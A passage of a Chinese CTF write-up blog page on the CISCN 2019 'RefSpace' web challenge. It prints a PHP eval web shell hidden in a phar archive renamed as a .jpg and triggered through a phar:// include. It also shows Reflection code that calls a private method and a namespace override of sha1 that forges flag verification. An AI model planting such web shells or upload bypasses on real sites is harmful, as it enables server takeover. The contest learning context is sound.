&quot;文件保存位置: &#123;$dst&#125;&lt;br /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">	我们不能让选手轻而易举的搜索到上传接口。&lt;br /&gt;</span><br><span class="line">	即便是运气好的人碰巧遇到了，我相信我们的过滤是万无一失的(才怪</span><br><span class="line">	&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">		&lt;label for=&quot;file&quot;&gt;来选择你的文件吧:&lt;/label&gt;</span><br><span class="line">		&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;</span><br><span class="line">		&lt;br /&gt;</span><br><span class="line">		&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>只能上传gif和jpg<br>这里由于前面有一个文件包含，于是尝试一下phar协议</p>
+<p>使用phar协议我们可以将脚本打包进一个phar包，然后就算修改为不同后缀名，但只要是通过phar协议去访问，依旧可以访问到我们的目标脚本。原因也很简单，打包成phar包的过程实际上是个序列化的过程，然后访问则是一个反序列化的过程，于是就算不是phar后缀也没关系</p>
+<p>于是上一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_GET[&apos;cmd&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后打包成phar包，上传，访问读目录</p>
+<p><code>?route=phar://upload/eval.jpg.jpg/eval&amp;cmd=print_r(scandir(&quot;.&quot;));</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/e5d0eceeb3b3813854ebc1c0903b7392.png" alt=""></p>
+<p>发现flag.txt，不过原题中是加密的，这里也就不从这拿flag。然后有个backup.zip，下下来解压看看</p>
+<p><img src="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/6e6a7d148d72172e269a2634256aa61f.png" alt=""></p>
+<p>给了我们刚刚不知道的FlagSDK中处理的操作<br>于是尝试去访问一下getHash()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;FlagSDK.php&quot;);</span><br><span class="line">use interesting\FlagSDK;</span><br><span class="line">$a = new FlagSDK();</span><br><span class="line">echo $a-&gt;getHash();</span><br></pre></td></tr></table></figure>
+<p><img src="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/b80e3033b01017aceb71a86b0f60cdd4.png" alt=""></p>
+<p>报错，这个getHash居然是个私有方法，这就触及到我的知识盲区了Orz<br>于是各种查，找到了php中有个反射类，可以通过这个类去获取目标类的信息，甚至可以类外调用私有方法，牛逼啊【不过这也造成了很大的安全问题呀</p>
+<p><a href="https://www.cnblogs.com/KeenLeung/p/6041280.html" target="_blank" rel="noopener">PHP的反射类ReflectionClass、ReflectionMethod使用实例
+</a></p>
+<p>于是一波操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;FlagSDK.php&quot;);</span><br><span class="line">$class = new ReflectionClass(&apos;\interesting\FlagSDK&apos;);</span><br><span class="line">$intance = $class-&gt;newInstanceArgs();</span><br><span class="line">$method = $class-&gt;getmethod(&apos;getHash&apos;);</span><br><span class="line">$method-&gt;setAccessible(true);</span><br><span class="line">echo $method-&gt;invoke($intance);</span><br></pre></td></tr></table></figure>
+<p>这里newInstanceArgs是实例化类，getmethod是指向要调用的方法，setAccessible设置权限，invoke执行</p>
+<p><img src="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/1cdee3575d5f926013b8c7cf12e17f21.png" alt=""></p>
+<p>拿到hash<br>然后再重写一下sha1方法，这里记得要设置命名空间，不然会直接去调用原生的sha1方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace interesting;</span><br><span class="line"></span><br><span class="line">function sha1($a)&#123;</span><br><span class="line">	return &apos;ajdsfjvcnvkz1564cxz4c&apos;;</span><br><span class="line">&#125; </span><br><span class="line">include(&quot;FlagSDK.php&quot;);</span><br><span class="line">use interesting\FlagSDK;</span><br><span class="line">$a = new FlagSDK();</span><br><span class="line">$flag = $a-&gt;verify(1);</span><br><span class="line">echo $flag;</span><br></pre></td></tr></table></figure>
+<p><img src="http://shifeng-kaze.cn/blog/ciscn2019_web_wp/6bdfdf95d953d1e03c5a3fe31f564687.png" alt=""></p>
+<p>拿到flag</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/01/hackme-web-wp/" rel="next" title="hackme web wp">
+                <i class="fa fa-chevron-left"></i> hackme web wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/20/RCTF2019-web-wp/" rel="prev" title="RCTF2019 web 复现">
+                RCTF2019 web 复现 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://shifeng-kaze.cn/blog/head/kotori.jpg" alt="k0t0r1">
+            
+              <p class="site-author-name" itemprop="name">k0t0r1</p>
+              <p class="site-description motion-element" itemprop="description">～いらっしゃいません～</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://shifeng-kaze.cn/" title="shifeng-kaze" target="_blank">shifeng-kaze</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aluvion.github.io" title="Aluvion" target="_blank">Aluvion</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#JustSoSo"><span class="nav-number">1.</span> <span class="nav-text">JustSoSo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#全宇宙最简单的SQL"><span class="nav-number">2.</span> <span class="nav-text">全宇宙最简单的SQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#love-math"><span class="nav-number">3.</span> <span class="nav-text">love_math</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RefSpace"><span class="nav-number">4.</span> <span class="nav-text">RefSpace</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">k0t0r1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+</body>
+</html>
